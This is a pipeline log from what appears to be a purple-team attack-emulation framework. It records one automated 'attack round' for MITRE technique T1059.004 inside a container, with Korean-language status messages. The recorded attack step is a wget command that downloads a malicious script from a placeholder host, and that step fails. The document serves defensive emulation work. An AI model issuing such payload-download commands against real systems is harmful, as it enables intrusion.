[32m2026-08-15 22:37:41 +0900[0m - dagster - [34mDEBUG[0m - __ASSET_JOB - 6f3092a2-149e-42db-9aee-01ccb642d9a0 - 47127 - LOGS_CAPTURED - Capturing logs for process (pid: 47127).
[32m2026-08-15 22:37:41 +0900[0m - dagster - [34mDEBUG[0m - __ASSET_JOB - 6f3092a2-149e-42db-9aee-01ccb642d9a0 - 47127 - run_attack_round - STEP_START - Started execution of step "run_attack_round".
[32m2026-08-15 22:37:41 +0900[0m - dagster - [34mINFO[0m - __ASSET_JOB - 6f3092a2-149e-42db-9aee-01ccb642d9a0 - run_attack_round - [run_attack_round] 실행: limactl shell default -- bash -c cd /Users/kwonjunhui/Desktop/PurpleBPF && source ~/purplebpf.env && python3 -m purplebpf.offensive.executor.executor T1059.004
[32m2026-08-15 22:38:06 +0900[0m - dagster - [34mINFO[0m - __ASSET_JOB - 6f3092a2-149e-42db-9aee-01ccb642d9a0 - run_attack_round - [run_attack_round] returncode=0
[32m2026-08-15 22:38:06 +0900[0m - dagster - [34mINFO[0m - __ASSET_JOB - 6f3092a2-149e-42db-9aee-01ccb642d9a0 - run_attack_round - [run_attack_round] stdout:
=== 1차 필터 판정 ===
{
  "verdict": "PASS",
  "checks": {
    "structure": {
      "passed": true,
      "issues": []
    },
    "syntax": {
      "passed": true,
      "issues": [
        {
          "level": "warning",
          "message": "shellcheck가 설치되어 있지 않아 문법 검사를 건너뛴다."
        }
      ]
    },
    "ordering": {
      "passed": true,
      "issues": []
    }
  },
  "reasons": []
}
=== 실행 결과 (execution_log 기록) ===
{
  "run_id": 9,
  "round_id": 1,
  "chain_id": "79bb4431-f149-45d5-a59f-878621dfb41e",
  "technique": "T1059.004",
  "channel": "syscall",
  "success": false,
  "started_at": "2026-08-15 13:38:06.476634+00:00",
  "finished_at": "2026-08-15 13:38:06.496241+00:00",
  "container_id": "70a8025283d2",
  "created_at": "2026-08-15 13:38:06.528212+00:00",
  "step_results": [
    {
      "order": 1,
      "command": "wget https://example.com/malicious_script.sh",
      "exit_code": 127,
      "output": "bash: line 1: wget: command not found\n"
    }
  ]
}

[32m2026-08-15 22:38:06 +0900[0m - dagster - [34mDEBUG[0m - __ASSET_JOB - 6f3092a2-149e-42db-9aee-01ccb642d9a0 - 47127 - run_attack_round - STEP_OUTPUT - Yielded output "result" of type "Any". (Type check passed).
[32m2026-08-15 22:38:06 +0900[0m - dagster - [34mDEBUG[0m - __ASSET_JOB - 6f3092a2-149e-42db-9aee-01ccb642d9a0 - 47127 - run_attack_round - ASSET_MATERIALIZATION - Materialized value run_attack_round.
[32m2026-08-15 22:38:06 +0900[0m - dagster - [34mDEBUG[0m - __ASSET_JOB - 6f3092a2-149e-42db-9aee-01ccb642d9a0 - 47127 - run_attack_round - STEP_SUCCESS - Finished execution of step "run_attack_round" in 24.82s.
